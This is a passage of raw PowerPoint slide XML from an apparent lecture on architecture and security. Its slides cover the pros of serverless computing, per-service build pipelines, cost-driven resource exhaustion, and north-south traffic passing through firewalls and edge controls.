              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to your system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Also: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Retire old versions quickly; automate contract testing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40C8D048-95A9-75D3-A950-21A84F426494}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>77</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30073396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654A9-AB9E-DD56-C034-774EBD475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07320-A0B7-3677-591E-0236B89E9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4EA51-0F10-60C2-6532-B4BA7980C9DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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4DDE2340-3B43-46FE-938C-516AF21F93AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>78</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23359827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2BB4-D51D-CE3E-3892-56D35E228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332B0-4D96-7F1C-5B39-1156BF723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67596-A62F-E61A-95EE-5E2F9D46E925}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each service ships its own image/deps/CI path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14E2D6CD-0A23-F12D-03E8-612D534DADB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>79</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39823324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7E8D2-DBA5-B824-579C-758EA71E8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F2768-6EC8-1804-DF7D-DC06EA060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77044-2CE8-472D-6152-EABA8309F702}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>The Pizza shop: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>A 3rd party provides the kitchen, burners, utensils, and you pay them per use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Pros:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Scale-to-zero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: great for bursty workloads or infrequent jobs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ops offload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: patching the fleet is the provider’s job (to a point).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Granular isolation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: compromise of one function ≠ your whole system.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event native</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: excellent for pipelines (media processing, ETL, fan-out/fan-in).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC3B495E-A978-BBE5-06AF-ED7677CEB0DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>80</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13918703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AD587-F610-F03D-1395-AB73F7B83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56724-C8A4-A572-D537-925F1947F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A497B-5792-BD24-B5ED-AF145988A0BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each service ships its own image/deps/CI path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B769C9A-262A-7AB2-24A3-F6753472EF17}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>81</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7509830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1B63-2647-7EF3-A8AB-644A369A5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E7D77-3F5B-C8D2-DE6C-4A8E17DB6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8F97D-71BF-9316-AFA1-05B447A2F923}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each service ships its own image/deps/CI path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F56E91BC-6773-495A-08A7-A4D36E11EE20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>82</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="88522471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4CF78-3FB2-2366-AC68-6DEFE65B3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1E8C9-3915-B105-12A5-1EDD20940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88C9F-63A8-6C4D-3603-02857D589BED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each service ships its own image/deps/CI path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7368B7F3-399E-58A9-3DD9-15DC5758761E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>83</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33056783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CDCC-4B09-E59D-F311-79829D54F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FBFFF-FD57-89DE-AE73-0DE3C2331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DDF4E-82F6-A49F-30CA-C3F2F9EF7C73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each service ships its own image/deps/CI path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{068676B6-72D1-86E8-ABC2-509F90BBBDE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>84</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25088386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D3EC-C2E6-5C6D-81DF-283AF01A9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868AD-4E5D-3C6F-6D52-3FDA87663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904C5-A045-D5E7-22CF-241444477C7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Double-edged sword – cost limitations can cause resource exhaustion (Check this)</a:t>
            </a:r>
          </a:p>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BF765022-D0BB-ED3B-9CF9-3136C5AD9A98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>85</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8195684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EBB2C-626D-F3BB-5179-D83C1C0F2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FC03F-1274-B16A-2427-C9CBB11FB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87460-E066-303B-9142-60486A53076C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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8862B173-11CE-3607-3E92-6A30C5A22059}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>86</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19101934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1283-2787-0406-E6F2-528FF67D6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B98D1-BBB9-7291-E937-BE121C022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5523D5-DFD5-DA4D-36B9-DD33333F7B33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Typical path:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Client (Internet) → Edge Router → Firewall → Load Balancer → App Server</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> App Server → Firewall → Edge Router → Internet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Characteristics:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Crosses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>network boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (internet ↔ corporate, WAN ↔ DC, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Typically controlled by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>perimeter firewalls, IDS/IPS, WAF, DDoS protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Goes through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>core/edge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> of the network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Usually </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fewer flows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> but </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>higher visibility</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (everyone monitors the edge)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91550114-08C2-1B75-0F66-2C5EF7D154CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>88</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3633996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C68C1-0826-5372-BA5B-6EA58533D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6BAA1-8468-2319-BF41-8BCB6000F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92C42-2C92-565C-97D1-F35179B5724C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
